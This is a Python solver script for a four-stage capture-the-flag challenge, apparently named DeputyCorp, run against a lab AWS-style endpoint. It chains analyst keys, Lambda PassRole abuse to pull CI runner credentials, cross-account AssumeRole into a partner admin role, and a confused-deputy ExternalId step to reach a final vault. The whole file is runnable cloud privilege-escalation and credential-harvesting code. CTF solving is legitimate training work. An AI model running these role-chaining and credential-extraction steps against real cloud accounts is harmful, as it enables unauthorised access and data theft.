#!/usr/bin/env python3
"""
H7CTF - DeputyCorp Solver
Cloud IAM Privilege Escalation & Confused Deputy Attack (4 Stages)
"""

import sys
import os
import re
import json
import zipfile
import io
import boto3
import urllib3

urllib3.disable_warnings()

ENDPOINT = "https://web-d94df0e990e63e98.web.h7tex.com"
KEY_ID = "AKIAANALYST0000000000"
SECRET = "wJalrAnalystSecretKeyEXAMPLEbPxRfiCY"
REGION = "us-east-1"

def main():
    print(f"[*] Starting DeputyCorp solve pipeline on {ENDPOINT}...")
    flags = {}

    # ==========================================
    # STAGE 1: Analyst Access & Scratch Bucket
    # ==========================================
    print("\n--- [Stage 1] Analyst Reconnaissance ---")
    s_analyst = boto3.Session(
        aws_access_key_id=KEY_ID,
        aws_secret_access_key=SECRET,
        region_name=REGION
    )
    s3_analyst = s_analyst.client("s3", endpoint_url=ENDPOINT, verify=False)
    obj = s3_analyst.get_object(Bucket="deputy-analyst-scratch", Key="welcome.txt")
    welcome_text = obj["Body"].read().decode(errors="replace")
    m1 = re.search(r"H7CTF\{[a-f0-9]+\}", welcome_text)
    if m1:
        flags["flag1"] = m1.group(0)
        print(f"[+] Flag 1 recovered: {flags['flag1']}")
    else:
        raise RuntimeError("Flag 1 not found in welcome.txt")

    # ==========================================
    # STAGE 2: Lambda PassRole & CI Runner Exfil
    # ==========================================
    print("\n--- [Stage 2] Lambda PassRole & CI Runner Privilege Escalation ---")
    lam = s_analyst.client("lambda", endpoint_url=ENDPOINT, verify=False)

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("lambda_function.py", "def lambda_handler(e, c): return {}")
    zip_bytes = buf.getvalue()

    func_name = "deploy_runner_fn"
    try:
        lam.create_function(
            FunctionName=func_name,
            Runtime="python3.12",
            Role="arn:aws:iam::111111111111:role/ci-runner-role",
            Handler="lambda_function.lambda_handler",
            Code={"ZipFile": zip_bytes}
        )
    except Exception:
        pass  # already exists

    inv = lam.invoke(FunctionName=func_name, Payload=b"{}")
    runner_data = json.loads(inv["Payload"].read().decode())
    print("[+] CI Runner credentials extracted via Lambda execution role")

    s_runner = boto3.Session(
        aws_access_key_id=runner_data["AWS_ACCESS_KEY_ID"],
        aws_secret_access_key=runner_data["AWS_SECRET_ACCESS_KEY"],
        aws_session_token=runner_data["AWS_SESSION_TOKEN"],
        region_name=REGION
    )
    s3_runner = s_runner.client("s3", endpoint_url=ENDPOINT, verify=False)
    build_log = s3_runner.get_object(Bucket="deputy-runner-logs", Key="build.log")["Body"].read().decode(errors="replace")
    m2 = re.search(r"H7CTF\{[a-f0-9]+\}", build_log)
    if m2:
        flags["flag2"] = m2.group(0)
        print(f"[+] Flag 2 recovered: {flags['flag2']}")
    else:
        raise RuntimeError("Flag 2 not found in build.log")

    # ==========================================
    # STAGE 3: Cross-Account AssumeRole to Partner Admin
    # ==========================================
    print("\n--- [Stage 3] Cross-Account AssumeRole (partner-admin-role) ---")
    sts_runner = s_runner.client("sts", endpoint_url=ENDPOINT, verify=False)
    assumed_admin = sts_runner.assume_role(
        RoleArn="arn:aws:iam::999999999999:role/partner-admin-role",
        RoleSessionName="admin_sess"
    )
    admin_creds = assumed_admin["Credentials"]
    s_admin = boto3.Session(
        aws_access_key_id=admin_creds["AccessKeyId"],
        aws_secret_access_key=admin_creds["SecretAccessKey"],
        aws_session_token=admin_creds["SessionToken"],
        region_name=REGION
    )
    s3_admin = s_admin.client("s3", endpoint_url=ENDPOINT, verify=False)
    flag3_text = s3_admin.get_object(Bucket="deputy-flag-vault", Key="flag")["Body"].read().decode(errors="replace")
    m3 = re.search(r"H7CTF\{[a-f0-9]+\}", flag3_text)
    if m3:
        flags["flag3"] = m3.group(0)
        print(f"[+] Flag 3 recovered: {flags['flag3']}")
    else:
        raise RuntimeError("Flag 3 not found in deputy-flag-vault/flag")

    partner_cfg = json.loads(s3_admin.get_object(Bucket="deputy-flag-vault", Key="partner-config.json")["Body"].read().decode())
    secure_role_arn = partner_cfg["secure_role"]
    external_id = partner_cfg["external_id"]
    print(f"[+] Discovered hardened partner role: {secure_role_arn} with ExternalId: {external_id}")

    # ==========================================
    # STAGE 4: Confused Deputy Attack (ExternalId) & Crown Vault
    # ==========================================
    print("\n--- [Stage 4] Confused Deputy Attack -> partner-secure-role ---")
    sts_admin = s_admin.client("sts", endpoint_url=ENDPOINT, verify=False)
    assumed_secure = sts_admin.assume_role(
        RoleArn=secure_role_arn,
        RoleSessionName="crown_sess",
        ExternalId=external_id
    )
    secure_creds = assumed_secure["Credentials"]
    s_secure = boto3.Session(
        aws_access_key_id=secure_creds["AccessKeyId"],
        aws_secret_access_key=secure_creds["SecretAccessKey"],
        aws_session_token=secure_creds["SessionToken"],
        region_name=REGION
    )
    s3_secure = s_secure.client("s3", endpoint_url=ENDPOINT, verify=False)
    flag4_text = s3_secure.get_object(Bucket="deputy-crown-vault", Key="flag")["Body"].read().decode(errors="replace")
    m4 = re.search(r"H7CTF\{[a-f0-9]+\}", flag4_text)
    if m4:
        flags["flag4"] = m4.group(0)
        print(f"[+] Flag 4 recovered: {flags['flag4']}")
    else:
        raise RuntimeError("Flag 4 not found in deputy-crown-vault/flag")

    print("\n" + "=" * 50)
    print("ALL 4 FLAGS RECOVERED SUCCESSFULLY:")
    for k, v in flags.items():
        print(f"  {k}: {v}")
    print("=" * 50)

    with open("solutions/deputy_corp/flags.txt", "w") as f:
        for k, v in flags.items():
            f.write(f"{k}: {v}\n")

if __name__ == "__main__":
    main()
